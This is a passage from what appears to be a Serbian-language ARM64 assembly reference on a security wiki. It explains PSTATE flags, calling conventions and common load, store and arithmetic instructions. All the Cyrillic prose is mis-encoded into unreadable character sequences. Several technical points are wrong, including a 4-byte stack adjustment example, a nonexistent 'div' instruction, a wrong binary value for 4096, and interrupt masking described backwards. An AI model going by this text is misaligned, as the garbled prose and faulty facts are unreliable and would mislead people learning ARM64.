* `mrs x0, TPIDR_EL0 ; –ß–∏—Ç–∞ TPIDR_EL0 —É x0`
* `msr TPIDR_EL0, X0 ; –ó–∞–ø–∏—Å—É—ò–µ x0 —É TPIDR_EL0`

### **PSTATE**

**PSTATE** —Å–∞–¥—Ä–∂–∏ –Ω–µ–∫–æ–ª–∏–∫–æ –∫–æ–º–ø–æ–Ω–µ–Ω—Ç–∏ –ø—Ä–æ—Ü–µ—Å–∞ —Å–µ—Ä–∏—ò–∞–ª–∏–∑–æ–≤–∞–Ω–∏—Ö —É —Ä–µ–≥–∏—Å—Ç—Ä—É —Å–ø–µ—Ü–∏—ò–∞–ª–Ω–µ –Ω–∞–º–µ–Ω–µ –≤–∏–¥—ô–∏–≤–æ–º –æ–ø–µ—Ä–∞—Ç–∏–≤–Ω–æ–º —Å–∏—Å—Ç–µ–º—É **`SPSR_ELx`**, –≥–¥–µ —ò–µ X **–Ω–∏–≤–æ** **–¥–æ–∑–≤–æ–ª–µ** **–∏–∑–∞–∑–≤–∞–Ω–æ–≥** –∏–∑—É–∑–µ—õ–∞ (–æ–≤–æ –æ–º–æ–≥—É—õ–∞–≤–∞ –æ–ø–æ—Ä–∞–≤–∞–∫ —Å—Ç–∞—ö–∞ –ø—Ä–æ—Ü–µ—Å–∞ –∫–∞–¥–∞ –∏–∑—É–∑–µ—õ–µ –∑–∞–≤—Ä—à–∏).\
–û–≤–æ —Å—É –¥–æ—Å—Ç—É–ø–Ω–∞ –ø–æ—ô–∞:

<figure><img src="../../../.gitbook/assets/image (1196).png" alt=""><figcaption></figcaption></figure>

* **`N`**, **`Z`**, **`C`** –∏ **`V`** —É—Å–ª–æ–≤–Ω–µ –∑–∞—Å—Ç–∞–≤–∏—Ü–µ:
* **`N`** –∑–Ω–∞—á–∏ –¥–∞ —ò–µ –æ–ø–µ—Ä–∞—Ü–∏—ò–∞ –¥–∞–ª–∞ –Ω–µ–≥–∞—Ç–∏–≤–∞–Ω —Ä–µ–∑—É–ª—Ç–∞—Ç
* **`Z`** –∑–Ω–∞—á–∏ –¥–∞ —ò–µ –æ–ø–µ—Ä–∞—Ü–∏—ò–∞ –¥–∞–ª–∞ –Ω—É–ª—É
* **`C`** –∑–Ω–∞—á–∏ –¥–∞ —ò–µ –æ–ø–µ—Ä–∞—Ü–∏—ò–∞ –ø—Ä–µ–Ω–µ–ª–∞
* **`V`** –∑–Ω–∞—á–∏ –¥–∞ —ò–µ –æ–ø–µ—Ä–∞—Ü–∏—ò–∞ –¥–∞–ª–∞ –ø–æ—Ç–ø–∏—Å–∞–Ω–æ –ø—Ä–µ–ª–∏–≤–∞—ö–µ:
* –ó–±–∏—Ä –¥–≤–∞ –ø–æ–∑–∏—Ç–∏–≤–Ω–∞ –±—Ä–æ—ò–∞ –¥–∞—ò–µ –Ω–µ–≥–∞—Ç–∏–≤–∞–Ω —Ä–µ–∑—É–ª—Ç–∞—Ç.
* –ó–±–∏—Ä –¥–≤–∞ –Ω–µ–≥–∞—Ç–∏–≤–Ω–∞ –±—Ä–æ—ò–∞ –¥–∞—ò–µ –ø–æ–∑–∏—Ç–∏–≤–∞–Ω —Ä–µ–∑—É–ª—Ç–∞—Ç.
* –£ –æ–¥—É–∑–∏–º–∞—ö—É, –∫–∞–¥–∞ —Å–µ –≤–µ–ª–∏–∫–∏ –Ω–µ–≥–∞—Ç–∏–≤–∞–Ω –±—Ä–æ—ò –æ–¥—É–∑–∏–º–∞ –æ–¥ –º–∞—ö–µ–≥ –ø–æ–∑–∏—Ç–∏–≤–Ω–æ–≥ –±—Ä–æ—ò–∞ (–∏–ª–∏ –æ–±—Ä–Ω—É—Ç–æ), –∞ —Ä–µ–∑—É–ª—Ç–∞—Ç –Ω–µ –º–æ–∂–µ –±–∏—Ç–∏ –ø—Ä–µ–¥—Å—Ç–∞–≤—ô–µ–Ω —É –æ–ø—Å–µ–≥—É –¥–∞—Ç–µ –≤–µ–ª–∏—á–∏–Ω–µ –±–∏—Ç–∞.
* –û—á–∏–≥–ª–µ–¥–Ω–æ, –ø—Ä–æ—Ü–µ—Å–æ—Ä –Ω–µ –∑–Ω–∞ –¥–∞ –ª–∏ —ò–µ –æ–ø–µ—Ä–∞—Ü–∏—ò–∞ –ø–æ—Ç–ø–∏—Å–∞–Ω–∞ –∏–ª–∏ –Ω–µ, –ø–∞ —õ–µ –ø—Ä–æ–≤–µ—Ä–∏—Ç–∏ C –∏ V —É –æ–ø–µ—Ä–∞—Ü–∏—ò–∞–º–∞ –∏ —É–∫–∞–∑–∞—Ç–∏ –¥–∞ –ª–∏ —ò–µ –¥–æ—à–ª–æ –¥–æ –ø—Ä–µ–Ω–æ—Å–∞ —É —Å–ª—É—á–∞—ò—É –¥–∞ —ò–µ –±–∏–ª–æ –ø–æ—Ç–ø–∏—Å–∞–Ω–æ –∏–ª–∏ –Ω–µ–ø–æ—Ç–ø–∏—Å–∞–Ω–æ.

{% hint style="warning" %}
–ù–∏—Å—É —Å–≤–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–µ –∞–∂—É—Ä–∏—Ä–∞–ª–µ –æ–≤–µ –∑–∞—Å—Ç–∞–≤–∏—Ü–µ. –ù–µ–∫–µ –∫–∞–æ **`CMP`** –∏–ª–∏ **`TST`** —Ç–æ —Ä–∞–¥–µ, –∞ –¥—Ä—É–≥–µ –∫–æ—ò–µ –∏–º–∞—ò—É s —Å—É—Ñ–∏–∫—Å –∫–∞–æ **`ADDS`** —Ç–∞–∫–æ—í–µ —Ç–æ —Ä–∞–¥–µ.
{% endhint %}

* –¢—Ä–µ–Ω—É—Ç–Ω–∞ **–∑–∞—Å—Ç–∞–≤–∏—Ü–∞ —à–∏—Ä–∏–Ω–µ —Ä–µ–≥–∏—Å—Ç—Ä–∞ (`nRW`)**: –ê–∫–æ –∑–∞—Å—Ç–∞–≤–∞ –¥—Ä–∂–∏ –≤—Ä–µ–¥–Ω–æ—Å—Ç 0, –ø—Ä–æ–≥—Ä–∞–º —õ–µ —Å–µ –∏–∑–≤—Ä—à–∞–≤–∞—Ç–∏ —É AArch64 –∏–∑–≤—Ä—à–Ω–æ–º —Å—Ç–∞—ö—É –∫–∞–¥–∞ —Å–µ –ø–æ–Ω–æ–≤–æ –ø–æ–∫—Ä–µ–Ω–µ.
* –¢—Ä–µ–Ω—É—Ç–Ω–∏ **–ù–∏–≤–æ –∏–∑—É–∑–µ—Ç–∞–∫–∞** (**`EL`**): –†–µ–¥–æ–≤–∞–Ω –ø—Ä–æ–≥—Ä–∞–º –∫–æ—ò–∏ —Ä–∞–¥–∏ —É EL0 —õ–µ –∏–º–∞—Ç–∏ –≤—Ä–µ–¥–Ω–æ—Å—Ç 0
* **–ó–∞—Å—Ç–∞–≤–∏—Ü–∞ –ø–æ—ò–µ–¥–∏–Ω–∞—á–Ω–æ–≥ –∫–æ—Ä–∞–∫–∞** (**`SS`**): –ö–æ—Ä–∏—Å—Ç–∏ —Å–µ –æ–¥ —Å—Ç—Ä–∞–Ω–µ –¥–µ–±–∞–≥–µ—Ä–∞ –∑–∞ –ø–æ—ò–µ–¥–∏–Ω–∞—á–Ω–æ –∫–æ—Ä–∞—á–µ—ö–µ –ø–æ—Å—Ç–∞–≤—ô–∞—ò—É—õ–∏ SS –∑–∞—Å—Ç–∞–≤–∏—Ü—É –Ω–∞ 1 —É–Ω—É—Ç–∞—Ä **`SPSR_ELx`** –∫—Ä–æ–∑ –∏–∑—É–∑–µ—õ–µ. –ü—Ä–æ–≥—Ä–∞–º —õ–µ –∏–∑–≤—Ä—à–∏—Ç–∏ –∫–æ—Ä–∞–∫ –∏ –∏–∑–∞–∑–≤–∞—Ç–∏ –∏–∑—É–∑–µ—õ–µ –ø–æ—ò–µ–¥–∏–Ω–∞—á–Ω–æ–≥ –∫–æ—Ä–∞–∫–∞.
* **–ó–∞—Å—Ç–∞–≤–∏—Ü–∞ –Ω–µ–ª–µ–≥–∞–ª–Ω–æ–≥ –∏–∑—É–∑–µ—Ç–∫–∞** (**`IL`**): –ö–æ—Ä–∏—Å—Ç–∏ —Å–µ –∑–∞ –æ–∑–Ω–∞—á–∞–≤–∞—ö–µ –∫–∞–¥–∞ –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Å–∞–Ω–∏ —Å–æ—Ñ—Ç–≤–µ—Ä –∏–∑–≤—Ä—à–∏ –Ω–µ–≤–∞–∂–µ—õ–∏ –ø—Ä–µ–Ω–æ—Å –Ω–∏–≤–æ–∞ –∏–∑—É–∑–µ—Ç–∫–∞, –æ–≤–∞ –∑–∞—Å—Ç–∞–≤–∞ —Å–µ –ø–æ—Å—Ç–∞–≤—ô–∞ –Ω–∞ 1 –∏ –ø—Ä–æ—Ü–µ—Å–æ—Ä –∞–∫—Ç–∏–≤–∏—Ä–∞ –Ω–µ–ª–µ–≥–∞–ª–Ω–æ —Å—Ç–∞—ö–µ –∏–∑—É–∑–µ—Ç–∫–∞.
* **`DAIF`** –∑–∞—Å—Ç–∞–≤–∏—Ü–µ: –û–≤–µ –∑–∞—Å—Ç–∞–≤–∏—Ü–µ –æ–º–æ–≥—É—õ–∞–≤–∞—ò—É –ø—Ä–∏–≤–∏–ª–µ–≥–∏—Å–∞–Ω–æ–º –ø—Ä–æ–≥—Ä–∞–º—É –¥–∞ —Å–µ–ª–µ–∫—Ç–∏–≤–Ω–æ –º–∞—Å–∫–∏—Ä–∞ –æ–¥—Ä–µ—í–µ–Ω–∞ —Å–ø–æ—ô–Ω–∞ –∏–∑—É–∑–µ—õ–∞.
* –ê–∫–æ —ò–µ **`A`** 1, —Ç–æ –∑–Ω–∞—á–∏ –¥–∞ —õ–µ –±–∏—Ç–∏ –∞–∫—Ç–∏–≤–∏—Ä–∞–Ω–∏ **–∞—Å–∏–Ω—Ö—Ä–æ–Ω–∏ –ø—Ä–µ–∫–∏–¥–∏**. **`I`** –∫–æ–Ω—Ñ–∏–≥—É—Ä–∏—à–µ –æ–¥–≥–æ–≤–æ—Ä –Ω–∞ —Å–ø–æ—ô–Ω–µ –∑–∞—Ö—Ç–µ–≤–µ –∑–∞ –ø—Ä–µ–∫–∏–¥ —Ö–∞—Ä–¥–≤–µ—Ä–∞ (IRQ). –∏ F —ò–µ –ø–æ–≤–µ–∑–∞–Ω —Å–∞ **–±—Ä–∑–∏–º –∑–∞—Ö—Ç–µ–≤–∏–º–∞ –∑–∞ –ø—Ä–µ–∫–∏–¥** (FIR).
* **–ó–∞—Å—Ç–∞–≤–∏—Ü–µ –∏–∑–±–æ—Ä–∞ –ø–æ–∫–∞–∑–∏–≤–∞—á–∞ —Å—Ç–µ–∫–∞** (**`SPS`**): –ü—Ä–∏–≤–∏–ª–µ–≥–∏—Å–∞–Ω–∏ –ø—Ä–æ–≥—Ä–∞–º–∏ –∫–æ—ò–∏ —Ä–∞–¥–µ —É EL1 –∏ –∏–∑–Ω–∞–¥ –º–æ–≥—É –¥–∞ –ø—Ä–µ–ª–∞–∑–µ –∏–∑–º–µ—í—É –∫–æ—Ä–∏—à—õ–µ—ö–∞ —Å–≤–æ–≥ —Ä–µ–≥–∏—Å—Ç–∞—Ä–∞ –ø–æ–∫–∞–∑–∏–≤–∞—á–∞ —Å—Ç–µ–∫–∞ –∏ –∫–æ—Ä–∏—Å–Ω–∏—á–∫–æ–≥ –º–æ–¥–µ–ª–∞ (–Ω–ø—Ä. –∏–∑–º–µ—í—É `SP_EL1` –∏ `EL0`). –û–≤–∞ –ø—Ä–µ–ª–∞–∑–∞–∫ —Å–µ –∏–∑–≤–æ–¥–∏ –ø–∏—Å–∞—ö–µ–º —É **`SPSel`** –ø–æ—Å–µ–±–∞–Ω —Ä–µ–≥–∏—Å—Ç–∞—Ä. –û–≤–æ –Ω–µ –º–æ–∂–µ –±–∏—Ç–∏ —É—á–∏—ö–µ–Ω–æ –∏–∑ EL0.

## **–ö–æ–Ω–≤–µ–Ω—Ü–∏—ò–∞ –ø–æ–∑–∏–≤–∞ (ARM64v8)**

ARM64 –∫–æ–Ω–≤–µ–Ω—Ü–∏—ò–∞ –ø–æ–∑–∏–≤–∞ —Å–ø–µ—Ü–∏—Ñ–∏–∫—É—ò–µ –¥–∞ —Å–µ **–ø—Ä–≤–∏—Ö –æ—Å–∞–º –ø–∞—Ä–∞–º–µ—Ç–∞—Ä–∞** —Ñ—É–Ω–∫—Ü–∏—ò–µ –ø—Ä–µ–Ω–æ—Å–∏ —É —Ä–µ–≥–∏—Å—Ç—Ä–∏–º–∞ **`x0` –¥–æ `x7`**. **–î–æ–¥–∞—Ç–Ω–∏** –ø–∞—Ä–∞–º–µ—Ç—Ä–∏ —Å–µ –ø—Ä–µ–Ω–æ—Å–µ –Ω–∞ **—Å—Ç–µ–∫—É**. **–í—Ä–µ–¥–Ω–æ—Å—Ç** **–ø–æ–≤—Ä–∞—Ç–∫–∞** —Å–µ –≤—Ä–∞—õ–∞ —É —Ä–µ–≥–∏—Å—Ç–∞—Ä **`x0`**, –∏–ª–∏ —É **`x1`** –∞–∫–æ —ò–µ **–¥—É–∂–∏–Ω–µ 128 –±–∏—Ç**. –†–µ–≥–∏—Å—Ç—Ä–∏ **`x19`** –¥–æ **`x30`** –∏ **`sp`** –º–æ—Ä–∞—ò—É –±–∏—Ç–∏ **–æ—á—É–≤–∞–Ω–∏** —Ç–æ–∫–æ–º –ø–æ–∑–∏–≤–∞ —Ñ—É–Ω–∫—Ü–∏—ò–∞.

–ö–∞–¥–∞ —á–∏—Ç–∞—Ç–µ —Ñ—É–Ω–∫—Ü–∏—ò—É —É –∞—Å–µ–º–±–ª–µ—Ä—É, –ø–æ—Ç—Ä–∞–∂–∏—Ç–µ **–ø—Ä–æ–ª–æ–≥ –∏ –µ–ø–∏–ª–æ–≥ —Ñ—É–Ω–∫—Ü–∏—ò–µ**. **–ü—Ä–æ–ª–æ–≥** –æ–±–∏—á–Ω–æ —É–∫—ô—É—á—É—ò–µ **—á—É–≤–∞—ö–µ –ø–æ–∫–∞–∑–∏–≤–∞—á–∞ –æ–∫–≤–∏—Ä–∞ (`x29`)**, **–ø–æ—Å—Ç–∞–≤—ô–∞—ö–µ** –Ω–æ–≤–æ–≥ **–ø–æ–∫–∞–∑–∏–≤–∞—á–∞ –æ–∫–≤–∏—Ä–∞**, –∏ **–∞–ª–æ–∫–∞—Ü–∏—ò—É –ø—Ä–æ—Å—Ç–æ—Ä–∞ –Ω–∞ —Å—Ç–µ–∫—É**. **–ï–ø–∏–ª–æ–≥** –æ–±–∏—á–Ω–æ —É–∫—ô—É—á—É—ò–µ **–≤—Ä–∞—õ–∞—ö–µ —Å–∞—á—É–≤–∞–Ω–æ–≥ –ø–æ–∫–∞–∑–∏–≤–∞—á–∞ –æ–∫–≤–∏—Ä–∞** –∏ **–≤—Ä–∞—õ–∞—ö–µ** –∏–∑ —Ñ—É–Ω–∫—Ü–∏—ò–µ.

### –ö–æ–Ω–≤–µ–Ω—Ü–∏—ò–∞ –ø–æ–∑–∏–≤–∞ —É Swift

Swift –∏–º–∞ —Å–≤–æ—ò—É **–∫–æ–Ω–≤–µ–Ω—Ü–∏—ò—É –ø–æ–∑–∏–≤–∞** –∫–æ—ò–∞ —Å–µ –º–æ–∂–µ –Ω–∞—õ–∏ –Ω–∞ [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **–£–æ–±–∏—á–∞—ò–µ–Ω–µ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–µ (ARM64v8)**

ARM64 –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–µ –æ–±–∏—á–Ω–æ –∏–º–∞—ò—É **—Ñ–æ—Ä–º–∞—Ç `opcode dst, src1, src2`**, –≥–¥–µ —ò–µ **`opcode`** **–æ–ø–µ—Ä–∞—Ü–∏—ò–∞** –∫–æ—ò–∞ —Å–µ –∏–∑–≤—Ä—à–∞–≤–∞ (–∫–∞–æ —à—Ç–æ —Å—É `add`, `sub`, `mov`, –∏—Ç–¥.), **`dst`** —ò–µ **—Ä–µ–≥–∏—Å—Ç–∞—Ä –¥–µ—Å—Ç–∏–Ω–∞—Ü–∏—ò–µ** —É –∫–æ—ò–∏ —õ–µ –±–∏—Ç–∏ —Å–∞—á—É–≤–∞–Ω —Ä–µ–∑—É–ª—Ç–∞—Ç, –∞ **`src1`** –∏ **`src2`** —Å—É **–∏–∑–≤–æ—Ä–Ω–∏** —Ä–µ–≥–∏—Å—Ç—Ä–∏. –û–¥–º–∞—Ö –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ —Å–µ —Ç–∞–∫–æ—í–µ –º–æ–≥—É –∫–æ—Ä–∏—Å—Ç–∏—Ç–∏ —É–º–µ—Å—Ç–æ –∏–∑–≤–æ—Ä–Ω–∏—Ö —Ä–µ–≥–∏—Å—Ç–∞—Ä–∞.

* **`mov`**: **–ü—Ä–µ–º–µ—Å—Ç–∏** –≤—Ä–µ–¥–Ω–æ—Å—Ç –∏–∑ —ò–µ–¥–Ω–æ–≥ **—Ä–µ–≥–∏—Å—Ç—Ä–∞** —É –¥—Ä—É–≥–∏.
* –ü—Ä–∏–º–µ—Ä: `mov x0, x1` ‚Äî –û–≤–æ –ø—Ä–µ–º–µ—à—Ç–∞ –≤—Ä–µ–¥–Ω–æ—Å—Ç –∏–∑ `x1` —É `x0`.
* **`ldr`**: **–£—á–∏—Ç–∞—ò** –≤—Ä–µ–¥–Ω–æ—Å—Ç –∏–∑ **–º–µ–º–æ—Ä–∏—ò–µ** —É **—Ä–µ–≥–∏—Å—Ç–∞—Ä**.
* –ü—Ä–∏–º–µ—Ä: `ldr x0, [x1]` ‚Äî –û–≤–æ —É—á–∏—Ç–∞–≤–∞ –≤—Ä–µ–¥–Ω–æ—Å—Ç –∏–∑ –º–µ–º–æ—Ä–∏—ò—Å–∫–µ –ª–æ–∫–∞—Ü–∏—ò–µ –Ω–∞ –∫–æ—ò—É —É–∫–∞–∑—É—ò–µ `x1` —É `x0`.
* **–†–µ–∂–∏–º –æ—Ñ—Å–µ—Ç**: –û—Ñ—Å–µ—Ç –∫–æ—ò–∏ —É—Ç–∏—á–µ –Ω–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª–Ω–∏ –ø–æ–∫–∞–∑–∏–≤–∞—á —ò–µ –Ω–∞–∑–Ω–∞—á–µ–Ω, –Ω–∞ –ø—Ä–∏–º–µ—Ä:
* `ldr x2, [x1, #8]`, –æ–≤–æ —õ–µ —É—á–∏—Ç–∞—Ç–∏ —É x2 –≤—Ä–µ–¥–Ω–æ—Å—Ç –∏–∑ x1 + 8
* `ldr x2, [x0, x1, lsl #2]`, –æ–≤–æ —õ–µ —É—á–∏—Ç–∞—Ç–∏ —É x2 –æ–±—ò–µ–∫–∞—Ç –∏–∑ –Ω–∏–∑–∞ x0, –∏–∑ –ø–æ–∑–∏—Ü–∏—ò–µ x1 (–∏–Ω–¥–µ–∫—Å) \* 4
* **–†–µ–∂–∏–º –ø—Ä–µ–¥-–∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–∞**: –û–≤–æ —õ–µ –ø—Ä–∏–º–µ–Ω–∏—Ç–∏ –∏–∑—Ä–∞—á—É–Ω–∞–≤–∞—ö–∞ –Ω–∞ –æ—Ä–∏–≥–∏–Ω–∞–ª, –¥–æ–±–∏—Ç–∏ —Ä–µ–∑—É–ª—Ç–∞—Ç –∏ —Ç–∞–∫–æ—í–µ —Å–∞—á—É–≤–∞—Ç–∏ –Ω–æ–≤–∏ –æ—Ä–∏–≥–∏–Ω–∞–ª —É –æ—Ä–∏–≥–∏–Ω–∞–ª—É.
* `ldr x2, [x1, #8]!`, –æ–≤–æ —õ–µ —É—á–∏—Ç–∞—Ç–∏ `x1 + 8` —É `x2` –∏ —Å–∞—á—É–≤–∞—Ç–∏ —É x1 —Ä–µ–∑—É–ª—Ç–∞—Ç `x1 + 8`
* `str lr, [sp, #-4]!`, –°–∞—á—É–≤–∞—ò—Ç–µ —Ä–µ–≥–∏—Å—Ç–∞—Ä –∑–∞ –ø–æ–≤—Ä–∞—Ç–∞–∫ —É sp –∏ –∞–∂—É—Ä–∏—Ä–∞—ò—Ç–µ —Ä–µ–≥–∏—Å—Ç–∞—Ä sp
* **–†–µ–∂–∏–º –ø–æ—Å—Ç-–∏–Ω–¥–∏–∫–∞—Ç–æ—Ä–∞**: –û–≤–æ —ò–µ –∫–∞–æ –ø—Ä–µ—Ç—Ö–æ–¥–Ω–∏, –∞–ª–∏ —Å–µ –º–µ–º–æ—Ä–∏—ò—Å–∫–∞ –∞–¥—Ä–µ—Å–∞ –ø—Ä–∏—Å—Ç—É–ø–∞ –∏ –∑–∞—Ç–∏–º —Å–µ –æ—Ñ—Å–µ—Ç –∏–∑—Ä–∞—á—É–Ω–∞–≤–∞ –∏ —á—É–≤–∞.
* `ldr x0, [x1], #8`, —É—á–∏—Ç–∞—ò—Ç–µ `x1` —É `x0` –∏ –∞–∂—É—Ä–∏—Ä–∞—ò—Ç–µ x1 —Å–∞ `x1 + 8`
* **PC-—Ä–µ–ª–∞—Ç–∏–≤–Ω–æ –∞–¥—Ä–µ—Å–∏—Ä–∞—ö–µ**: –£ –æ–≤–æ–º —Å–ª—É—á–∞—ò—É –∞–¥—Ä–µ—Å–∞ –∑–∞ —É—á–∏—Ç–∞–≤–∞—ö–µ —Å–µ –∏–∑—Ä–∞—á—É–Ω–∞–≤–∞ —Ä–µ–ª–∞—Ç–∏–≤–Ω–æ –Ω–∞ PC —Ä–µ–≥–∏—Å—Ç–∞—Ä
* `ldr x1, =_start`, –û–≤–æ —õ–µ —É—á–∏—Ç–∞—Ç–∏ –∞–¥—Ä–µ—Å—É –≥–¥–µ —Å–∏–º–±–æ–ª `_start` –ø–æ—á–∏—ö–µ —É x1 —É –æ–¥–Ω–æ—Å—É –Ω–∞ —Ç—Ä–µ–Ω—É—Ç–Ω–∏ PC.
* **`str`**: **–°–∞—á—É–≤–∞—ò—Ç–µ** –≤—Ä–µ–¥–Ω–æ—Å—Ç –∏–∑ **—Ä–µ–≥–∏—Å—Ç—Ä–∞** —É **–º–µ–º–æ—Ä–∏—ò—É**.
* –ü—Ä–∏–º–µ—Ä: `str x0, [x1]` ‚Äî –û–≤–æ —á—É–≤–∞ –≤—Ä–µ–¥–Ω–æ—Å—Ç —É `x0` —É –º–µ–º–æ—Ä–∏—ò—Å–∫–æ—ò –ª–æ–∫–∞—Ü–∏—ò–∏ –Ω–∞ –∫–æ—ò—É —É–∫–∞–∑—É—ò–µ `x1`.
* **`ldp`**: **–£—á–∏—Ç–∞—ò –ø–∞—Ä —Ä–µ–≥–∏—Å—Ç–∞—Ä–∞**. –û–≤–∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–∞ **—É—á–∏—Ç–∞–≤–∞ –¥–≤–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞** –∏–∑ **—É–∑–∞—Å—Ç–æ–ø–Ω–∏—Ö –º–µ–º–æ—Ä–∏—ò—Å–∫–∏—Ö** –ª–æ–∫–∞—Ü–∏—ò–∞. –ú–µ–º–æ—Ä–∏—ò—Å–∫–∞ –∞–¥—Ä–µ—Å–∞ —Å–µ –æ–±–∏—á–Ω–æ —Ñ–æ—Ä–º–∏—Ä–∞ –¥–æ–¥–∞–≤–∞—ö–µ–º –æ—Ñ—Å–µ—Ç–∞ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ —É –¥—Ä—É–≥–æ–º —Ä–µ–≥–∏—Å—Ç—Ä—É.
* –ü—Ä–∏–º–µ—Ä: `ldp x0, x1, [x2]` ‚Äî –û–≤–æ —É—á–∏—Ç–∞–≤–∞ `x0` –∏ `x1` –∏–∑ –º–µ–º–æ—Ä–∏—ò—Å–∫–∏—Ö –ª–æ–∫–∞—Ü–∏—ò–∞ –Ω–∞ `x2` –∏ `x2 + 8`, —Ä–µ—Å–ø–µ–∫—Ç–∏–≤–Ω–æ.
* **`stp`**: **–°–∞—á—É–≤–∞—ò –ø–∞—Ä —Ä–µ–≥–∏—Å—Ç–∞—Ä–∞**. –û–≤–∞ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏—ò–∞ **—Å–∞—á—É–≤–∞ –¥–≤–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞** —É **—É–∑–∞—Å—Ç–æ–ø–Ω–µ –º–µ–º–æ—Ä–∏—ò—Å–∫–µ** –ª–æ–∫–∞—Ü–∏—ò–µ. –ú–µ–º–æ—Ä–∏—ò—Å–∫–∞ –∞–¥—Ä–µ—Å–∞ —Å–µ –æ–±–∏—á–Ω–æ —Ñ–æ—Ä–º–∏—Ä–∞ –¥–æ–¥–∞–≤–∞—ö–µ–º –æ—Ñ—Å–µ—Ç–∞ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ —É –¥—Ä—É–≥–æ–º —Ä–µ–≥–∏—Å—Ç—Ä—É.
* –ü—Ä–∏–º–µ—Ä: `stp x0, x1, [sp]` ‚Äî –û–≤–æ —á—É–≤–∞ `x0` –∏ `x1` —É –º–µ–º–æ—Ä–∏—ò—Å–∫–∏–º –ª–æ–∫–∞—Ü–∏—ò–∞–º–∞ –Ω–∞ `sp` –∏ `sp + 8`, —Ä–µ—Å–ø–µ–∫—Ç–∏–≤–Ω–æ.
* `stp x0, x1, [sp, #16]!` ‚Äî –û–≤–æ —á—É–≤–∞ `x0` –∏ `x1` —É –º–µ–º–æ—Ä–∏—ò—Å–∫–∏–º –ª–æ–∫–∞—Ü–∏—ò–∞–º–∞ –Ω–∞ `sp+16` –∏ `sp + 24`, —Ä–µ—Å–ø–µ–∫—Ç–∏–≤–Ω–æ, –∏ –∞–∂—É—Ä–∏—Ä–∞ `sp` —Å–∞ `sp+16`.
* **`add`**: **–î–æ–¥–∞—ò—Ç–µ** –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ –¥–≤–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞ –∏ —Å–∞—á—É–≤–∞—ò—Ç–µ —Ä–µ–∑—É–ª—Ç–∞—Ç —É —Ä–µ–≥–∏—Å—Ç—Ä—É.
* –°–∏–Ω—Ç–∞–∫—Å–∞: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
* Xn1 -> –î–µ—Å—Ç–∏–Ω–∞—Ü–∏—ò–∞
* Xn2 -> –û–ø–µ—Ä–∞–Ω–¥ 1
* Xn3 | #imm -> –û–ø–µ—Ä–∞–Ω–¥ 2 (—Ä–µ–≥–∏—Å—Ç–∞—Ä –∏–ª–∏ –æ–¥–º–∞—Ö)
* \[shift #N | RRX] -> –ò–∑–≤—Ä—à–∏—Ç–µ –ø–æ–º–µ—Ä–∞—ö–µ –∏–ª–∏ –ø–æ–∑–æ–≤–∏—Ç–µ RRX
* –ü—Ä–∏–º–µ—Ä: `add x0, x1, x2` ‚Äî –û–≤–æ –¥–æ–¥–∞—ò–µ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ —É `x1` –∏ `x2` –∏ —á—É–≤–∞ —Ä–µ–∑—É–ª—Ç–∞—Ç —É `x0`.
* `add x5, x5, #1, lsl #12` ‚Äî –û–≤–æ —ò–µ —ò–µ–¥–Ω–∞–∫–æ 4096 (1 –ø–æ–º–µ—Ä–∞—á 12 –ø—É—Ç–∞) -> 1 0000 0000 0000 0000
* **`adds`** –û–≤–æ –∏–∑–≤—Ä—à–∞–≤–∞ `add` –∏ –∞–∂—É—Ä–∏—Ä–∞ –∑–∞—Å—Ç–∞–≤–∏—Ü–µ
* **`sub`**: **–û–¥—É–∑–º–∏—Ç–µ** –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ –¥–≤–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞ –∏ —Å–∞—á—É–≤–∞—ò—Ç–µ —Ä–µ–∑—É–ª—Ç–∞—Ç —É —Ä–µ–≥–∏—Å—Ç—Ä—É.
* –ü—Ä–æ–≤–µ—Ä–∏—Ç–µ **`add`** **—Å–∏–Ω—Ç–∞–∫—Å—É**.
* –ü—Ä–∏–º–µ—Ä: `sub x0, x1, x2` ‚Äî –û–≤–æ –æ–¥—É–∑–∏–º–∞ –≤—Ä–µ–¥–Ω–æ—Å—Ç —É `x2` –æ–¥ `x1` –∏ —á—É–≤–∞ —Ä–µ–∑—É–ª—Ç–∞—Ç —É `x0`.
* **`subs`** –û–≤–æ —ò–µ –∫–∞–æ sub –∞–ª–∏ –∞–∂—É—Ä–∏—Ä–∞ –∑–∞—Å—Ç–∞–≤–∏—Ü—É
* **`mul`**: **–ú–Ω–æ–∂–µ—ö–µ** –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ **–¥–≤–∞ —Ä–µ–≥–∏—Å—Ç—Ä–∞** –∏ —á—É–≤–∞—ö–µ —Ä–µ–∑—É–ª—Ç–∞—Ç–∞ —É —Ä–µ–≥–∏—Å—Ç—Ä—É.
* –ü—Ä–∏–º–µ—Ä: `mul x0, x1, x2` ‚Äî –û–≤–æ –º–Ω–æ–∂–µ—ö–µ –≤—Ä–µ–¥–Ω–æ—Å—Ç–∏ —É `x1` –∏ `x2` –∏ —á—É–≤–∞ —Ä–µ–∑—É–ª—Ç–∞—Ç —É `x0`.
* **`div`**: **–î–µ–ª–∏—Ç–µ** –≤—Ä–µ–¥–Ω–æ—Å—Ç —ò–µ–¥–Ω–æ–≥ —Ä–µ–≥–∏—Å—Ç—Ä–∞ —Å–∞ –¥—Ä—É–≥–∏–º –∏ —á—É–≤–∞—ò—Ç–µ —Ä–µ–∑—É–ª—Ç–∞—Ç —É —Ä–µ–≥–∏—Å—Ç—Ä—É.
